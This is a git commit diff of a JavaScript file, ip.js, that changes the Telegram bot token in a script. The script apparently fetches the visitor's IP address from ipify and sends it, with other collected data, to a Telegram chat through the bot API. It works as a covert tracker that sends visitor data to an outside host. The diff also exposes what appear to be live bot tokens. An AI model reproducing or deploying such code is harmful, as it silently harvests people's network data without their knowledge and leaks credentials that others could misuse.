771875049aee8ad0419871c0049ab18dc1205bb7
Anisha Ghosh <87559560+Anisha100@users.noreply.github.com>
2025-03-10 10:56:01 +0530

    Update ip.js

--- ip.js
+++ ip.js
@@ -13,7 +13,7 @@ fetch('https://api.ipify.org?format=json')
 	msg2=JSON.stringify(data, null, 2);
 	msg=msg+"\n"+msg2;
 	
-	url='https://api.telegram.org/bot7116418976:AAHHMdxfAshkZPzu5wwTLf7xerSl64BXiXg/sendMessage?chat_id=634841328&text='+encodeURI(msg);
+	url='https://api.telegram.org/bot8044232915:AAHZR8OiaCl8wm5HoHR3Y80bFWHWI6PbIi8/sendMessage?chat_id=634841328&text='+encodeURI(msg);
 	fetch(url).then(console.log("Done"));
 
 	})
